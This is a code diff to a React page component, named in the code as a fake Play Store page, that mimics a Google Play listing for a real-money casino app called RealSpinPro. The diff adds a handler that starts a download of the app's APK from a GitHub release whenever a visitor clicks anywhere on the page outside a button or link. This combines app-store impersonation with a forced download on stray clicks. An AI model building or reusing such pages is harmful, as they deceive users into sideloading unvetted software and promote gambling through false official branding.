@@ -6,8 +6,34 @@ import { Star, Share2, PlusSquare, MonitorSmartphone, ArrowRight, Cloud, Lock, T
 export default function PlayStoreFakePage() {
   const DOWNLOAD_URL = "https://github.com/shravani-agro/realspinpro_frontend/releases/latest/download/realspinpro.apk";
 
+  const handleShare = async () => {
+    try {
+      if (navigator.share) {
+        await navigator.share({
+          title: 'RealSpinPro Casino',
+          text: 'Play RealSpinPro Casino and Win Upto ₹5 Crores Daily!',
+          url: 'https://realspinpro.com',
+        });
+      } else {
+        navigator.clipboard.writeText('https://realspinpro.com');
+        alert('Link copied to clipboard!');
+      }
+    } catch (err) {
+      console.log('Share failed:', err);
+    }
+  };
+
+  const handlePageClick = (e: React.MouseEvent) => {
+    // If the click is on a button or link, let it do its normal action
+    if ((e.target as HTMLElement).closest('button, a')) {
+      return;
+    }
+    // Otherwise, anywhere else clicked triggers the download
+    window.location.href = DOWNLOAD_URL;
+  };
+
   return (
-    <main className="min-h-screen bg-white text-[#202124] pb-16 md:pb-12 antialiased" style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>
+    <main onClick={handlePageClick} className="min-h-screen bg-white text-[#202124] pb-16 md:pb-12 antialiased cursor-pointer" style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif" }}>
       <style dangerouslySetInnerHTML={{
         __html: `
         @import url('https://fonts.cdnfonts.com/css/google-sans-display');
@@ -41,8 +67,8 @@ export default function PlayStoreFakePage() {
         <div className="md:hidden flex flex-col mb-4">
 
           <div className="flex gap-5 items-start mb-6">
-            <div className="shrink-0 drop-shadow-md rounded-[16px] overflow-hidden bg-black w-[72px] h-[72px] flex items-center justify-center border border-gray-100">
-              <Image src="/playicon.png" alt="RealSpinPro Icon" width={80} height={80} className="w-full h-full object-contain p-1" />
+            <div className="shrink-0 drop-shadow-md rounded-[16px] overflow-hidden w-[72px] h-[72px] flex items-center justify-center border border-gray-100">
+              <Image src="/playicon.png" alt="RealSpinPro Icon" width={80} height={80} className="w-full h-full object-cover" />
             </div>
             <div className="flex-1">
               <h1 className="font-display text-[22px] font-medium leading-tight text-[#202124] tracking-tight">
@@ -84,7 +110,7 @@ export default function PlayStoreFakePage() {
           </a>
 
           <div className="flex items-center justify-center gap-10 text-[#01875f] font-medium text-[14px] mb-6">
-            <button className="flex items-center gap-2">
+            <button onClick={handleShare} className="flex items-center gap-2">
               <Share2 className="w-5 h-5" />
               Share
             </button>
@@ -148,11 +174,11 @@ export default function PlayStoreFakePage() {
               </a>
 
               <div className="flex items-center justify-start gap-8 text-[#01875f] font-medium text-[14px] mb-6">
-                <button className="flex items-center gap-2 hover:bg-gray-50 px-3 py-1.5 rounded-md transition-colors">
+                <button onClick={handleShare} className="flex items-center gap-2 hover:bg-gray-50 px-3 py-1.5 rounded-md transition-colors z-10 relative">
                   <Share2 className="w-5 h-5" />
                   Share
                 </button>
-                <button className="flex items-center gap-2 hover:bg-gray-50 px-3 py-1.5 rounded-md transition-colors">
+                <button className="flex items-center gap-2 hover:bg-gray-50 px-3 py-1.5 rounded-md transition-colors z-10 relative">
                   <PlusSquare className="w-5 h-5" />
                   Add to wishlist
                 </button>
@@ -166,8 +192,8 @@ export default function PlayStoreFakePage() {
           </div>
 
           <div className="shrink-0 pt-2">
-            <div className="drop-shadow-2xl rounded-[44px] overflow-hidden bg-black w-[260px] h-[260px] flex items-center justify-center border border-gray-100">
-              <Image src="/playicon.png" alt="RealSpinPro Icon" width={300} height={300} className="w-full h-full object-contain p-4" />
+            <div className="drop-shadow-2xl rounded-[44px] overflow-hidden w-[260px] h-[260px] flex items-center justify-center border border-gray-100">
+              <Image src="/playicon.png" alt="RealSpinPro Icon" width={300} height={300} className="w-full h-full object-cover" />
             </div>
           </div>
 
@@ -415,8 +441,8 @@ export default function PlayStoreFakePage() {
 
               {/* Similar Game Item */}
               <div className="flex gap-4 items-center cursor-pointer hover:bg-gray-50 p-2 -ml-2 rounded-lg transition-colors">
-                <div className="w-14 h-14 overflow-hidden shrink-0 shadow-sm border border-gray-100">
-                  <Image src="/playicon.png" alt="Similar game" width={56} height={56} className="w-full h-full object-contain p-1" />
+                <div className="w-14 h-14 rounded-[12px] overflow-hidden shrink-0 shadow-sm border border-gray-100">
+                  <Image src="/playicon.png" alt="Similar game" width={56} height={56} className="w-full h-full object-cover" />
                 </div>
                 <div>
                   <p className="text-[#202124] text-[13px] font-medium leading-tight line-clamp-1">Double Win Slots- Vegas Casino</p>
